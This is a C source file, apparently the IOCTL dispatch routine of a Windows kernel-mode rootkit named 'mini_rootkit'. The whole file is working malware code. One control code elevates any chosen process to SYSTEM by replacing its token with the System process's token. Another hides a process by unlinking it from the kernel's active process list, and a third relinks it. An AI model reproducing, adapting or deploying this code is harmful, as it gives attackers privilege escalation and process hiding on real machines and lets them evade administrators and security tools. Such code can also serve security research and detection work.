#include "dispatch.h"
#include <ntifs.h>
#include <wdm.h>
// Include minwindef.h after ntifs.h and wdm.h to avoid redefinition errors
#include <minwindef.h>
#include "mini_rootkit.h"
#include "shared/rootkit_uapi.h"
#include "structures.h"
#include "utils.h"

_Use_decl_annotations_ NTSTATUS DispatchFunction(IN OUT PDEVICE_OBJECT DeviceObject,
                                                 IN OUT PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION pStackLocation = NULL;
    pStackLocation = IoGetCurrentIrpStackLocation(Irp);

    switch (pStackLocation->MajorFunction) {
        case IRP_MJ_CREATE:
            MyDbgPrint("Handle to symbolink link %wZ opened", DEVICE_LINK);
            Irp->IoStatus.Information = 0;
            Irp->IoStatus.Status = STATUS_SUCCESS;
            break;

        case IRP_MJ_CLOSE:
            MyDbgPrint("Handle to symbolink link %wZ closed", DEVICE_LINK);
            Irp->IoStatus.Information = 0;
            Irp->IoStatus.Status = STATUS_SUCCESS;
            break;

        case IRP_MJ_DEVICE_CONTROL: {
            MyDbgPrint("Handle to symbolink link %wZ IOCTL", DEVICE_LINK);
            NTSTATUS status;
            ULONG ulIoControlCode = pStackLocation->Parameters.DeviceIoControl.IoControlCode;
            DWORD dwPid = 0;
            _PEPROCESS pProcTarget = NULL;

            Irp->IoStatus.Information = 0;

            if (ulIoControlCode == IOCTL_ROOT_PID || ulIoControlCode == IOCTL_HIDE_PID ||
                ulIoControlCode == IOCTL_SHOW_PID) {
                LONG lPid = *(PLONG)Irp->AssociatedIrp.SystemBuffer;
                MyDbgPrint("IOCTL_%s_PID: Received %ld bytes: %ld",
                           ulIoControlCode == IOCTL_ROOT_PID
                               ? "ROOT"
                               : (ulIoControlCode == IOCTL_HIDE_PID ? "HIDE" : "SHOW"),
                           pStackLocation->Parameters.DeviceIoControl.InputBufferLength, lPid);

                if (lPid > 0) {
                    status = PsLookupProcessByProcessId((HANDLE)lPid, &(PEPROCESS)pProcTarget);
                    if (!NT_SUCCESS(status)) {
                        MyDbgPrint("Failed to get process from PID (error: %d)", status);
                        Irp->IoStatus.Status = STATUS_NOT_FOUND;
                        break;
                    }
                    dwPid = lPid;
                } else if (lPid == PID_SELF) {
                    // Get current process (requestor)
                    pProcTarget = (_PEPROCESS)IoGetRequestorProcess(Irp);
                    if (pProcTarget == NULL) {
                        MyDbgPrint("Failed to get requestor process");
                        Irp->IoStatus.Status = STATUS_NOT_FOUND;
                        break;
                    }
                    dwPid = GetPid(pProcTarget);
                } else if (lPid == PID_PARENT) {
                    // Get parent process
                    _PEPROCESS pProcRequestor = (_PEPROCESS)IoGetRequestorProcess(Irp);
                    if (pProcRequestor == NULL) {
                        MyDbgPrint("Failed to get requestor process");
                        Irp->IoStatus.Status = STATUS_NOT_FOUND;
                        break;
                    }
                    dwPid = (DWORD)(ULONG_PTR)pProcRequestor->InheritedFromUniqueProcessId;
                    MyDbgPrint("Getting process details for parent PID: %ld", dwPid);
                    status = PsLookupProcessByProcessId((HANDLE)dwPid, &(PEPROCESS)pProcTarget);
                    if (!NT_SUCCESS(status)) {
                        MyDbgPrint("Failed to get process from parent PID (error: %d)", status);
                        Irp->IoStatus.Status = STATUS_NOT_FOUND;
                        break;
                    }
                } else {
                    MyDbgPrint("Invalid PID: %ld", lPid);
                    Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
                    break;
                }

                MyDbgPrint("Process to %s %p: %s (PID: %lu [%lx])",
                           ulIoControlCode == IOCTL_ROOT_PID
                               ? "elevate"
                               : (ulIoControlCode == IOCTL_HIDE_PID ? "hide" : "show"),
                           pProcTarget, pProcTarget->ImageFileName, GetPid(pProcTarget),
                           GetPid(pProcTarget));
            }

            BOOL bDoHide = FALSE;

            switch (ulIoControlCode) {
                case IOCTL_ROOT_PID: {
                    PTOKEN pTokenTarget = GetTokenAddress(&pProcTarget->Token);
                    MyDbgPrint("Current token: %p", pTokenTarget);
                    PrintSidInfo(pTokenTarget->UserAndGroups, pTokenTarget->UserAndGroupCount);

                    _PEPROCESS pProcSystem;
                    status = PsLookupProcessByProcessId((HANDLE)4, &(PEPROCESS)pProcSystem);
                    if (!NT_SUCCESS(status)) {
                        MyDbgPrint("Failed to get system process (error: %d)", status);
                        Irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
                        break;
                    }
                    MyDbgPrint("System process %p: %s (PID: %lu [%lx])", pProcSystem,
                               pProcSystem->ImageFileName, GetPid(pProcSystem),
                               GetPid(pProcSystem));
                    PTOKEN pSystemToken = GetTokenAddress(&pProcSystem->Token);
                    MyDbgPrint("System token: %p", pSystemToken);
                    PrintSidInfo(pSystemToken->UserAndGroups, pSystemToken->UserAndGroupCount);

                    ULONGLONG ullRefCnt = pProcTarget->Token.RefCnt;
                    pProcTarget->Token.Object = pSystemToken;
                    pProcTarget->Token.RefCnt = ullRefCnt;
                    MyDbgPrint("Process token replaced with System token");

                    break;
                }

                case IOCTL_HIDE_PID:
                    bDoHide = TRUE;
                case IOCTL_SHOW_PID: {
                    _PEPROCESS dwHiddenPid = GetHiddenPidEprocess(dwPid);
                    if (bDoHide) {
                        MyDbgPrint("Hiding PID %lu", dwPid);
                        if (dwHiddenPid != NULL) {
                            MyDbgPrint("PID %lu is already hidden", dwPid);
                            Irp->IoStatus.Status = STATUS_DUPLICATE_OBJECTID;
                            break;
                        }
                        AddHiddenPid(dwPid, pProcTarget);
                        RemoveListEntry(&pProcTarget->ActiveProcessLinks, TRUE);

                        MyDbgPrint("PID %lu hidden", dwPid);
                    } else {
                        MyDbgPrint("Showing PID %ld", dwPid);
                        if (dwHiddenPid == NULL) {
                            MyDbgPrint("PID %lu is not hidden", dwPid);
                            Irp->IoStatus.Status = STATUS_NOT_FOUND;
                            break;
                        }

                        _PEPROCESS pProcRequestor = (_PEPROCESS)IoGetRequestorProcess(Irp);
                        if (pProcRequestor == NULL) {
                            MyDbgPrint("Failed to get requestor process");
                            Irp->IoStatus.Status = STATUS_NOT_FOUND;
                            break;
                        }
                        InsertElementAfter(&pProcRequestor->ActiveProcessLinks,
                                           &dwHiddenPid->ActiveProcessLinks);
                        RemoveHiddenPid(dwPid);

                        MyDbgPrint("PID %lu shown", dwPid);
                    }

                    Irp->IoStatus.Status = STATUS_SUCCESS;
                    break;
                }

                default:
                    MyDbgPrint("Unknown IOCTL code: %lx", ulIoControlCode);
                    Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
                    break;
            }
        }
    }

    MyDbgPrint("Completing IRP with status: %ld", Irp->IoStatus.Status);
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Irp->IoStatus.Status;
}